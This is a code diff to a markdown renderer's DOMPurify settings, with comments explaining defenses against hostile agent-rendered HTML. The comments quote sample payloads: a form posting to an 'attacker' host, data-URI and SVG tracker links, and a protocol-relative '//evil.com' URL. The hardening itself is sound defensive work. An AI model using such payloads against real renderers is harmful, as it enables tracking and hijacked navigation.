@@ -102,31 +102,24 @@ export function renderMarkdown(src: string): string {
   const hit = cache.get(src);
   if (hit !== undefined) return hit;
   const raw = marked.parse(src, { async: false }) as string;
-  // Round 17 Sec M2: FORBID <form>. DOMPurify's default whitelist
-  // passes it, which lets an agent reply `<form action="https://attacker/x">
-  // <input/></form>` navigate the Wails webview's main frame on a
-  // stray Enter (default form-submit behavior, no event handler
-  // needed). Form CONTROLS (input/textarea/select/label) are allowed
-  // through — they're useful for genuine UI demos in markdown and
-  // Bubble.svelte's right-click bail-list already prevents them from
-  // stealing native Paste/Copy menus. Without an enclosing <form>
-  // they have no navigation power.
-  //
-  // We do NOT forbid <button> because the code-block renderer above
-  // emits its own <button class="cb-copy"> for the copy-code affordance.
-  //
-  // Round 20 frontend #4: ALLOWED_URI_REGEXP pins href/src/xlink:href
-  // to safe schemes only. DOMPurify's default already blocks
-  // javascript: + most weird schemes, but `data:` is allowed by
-  // default — an `<img src="data:text/html,...">` or SVG
-  // `<use xlink:href="https://tracker">` can phone home for tracking
-  // even though it can't execute. Restrict to https/mailto/anchors/
-  // relative paths; no `data:` exfil unless the renderer explicitly
-  // wants images (then loosen to `data:image/`).
+  // Round 20 frontend #4 + R21 fix: pin href/src/xlink:href to safe
+  // schemes. DOMPurify's default already blocks javascript:; we additionally
+  // block `data:` (an `<img src="data:text/html,...">` or SVG `<use
+  // xlink:href="https://tracker">` can phone home for tracking even though
+  // it can't execute — the Wails webview has no CSP). The regex accepts:
+  //   - https? / mailto / tel schemes
+  //   - anchors (#section)
+  //   - absolute-single-slash paths (/foo, NOT //attacker.com)
+  //   - bare relative paths (foo, foo/bar.png, ./foo, ../foo) — these
+  //     are the most common idiom in agent-rendered markdown and round
+  //     20's strict regex broke them all (image/link silently dropped).
+  // Note: any href starting with `/` is checked for the second char
+  // via the negative lookahead `(?!\/)` so protocol-relative `//evil.com`
+  // is refused.
   const clean = DOMPurify.sanitize(raw, {
     ADD_ATTR: ["target"],
     FORBID_TAGS: ["form"],
-    ALLOWED_URI_REGEXP: /^(?:https?:|mailto:|tel:|#|\/(?!\/))/i,
+    ALLOWED_URI_REGEXP: /^(?:(?:https?|mailto|tel):|#|\/(?!\/)|\.{0,2}\/|[^/:#?]+(?:[/?#]|$))/i,
   });
   if (cache.size >= MAX) {
     const first = cache.keys().next().value;
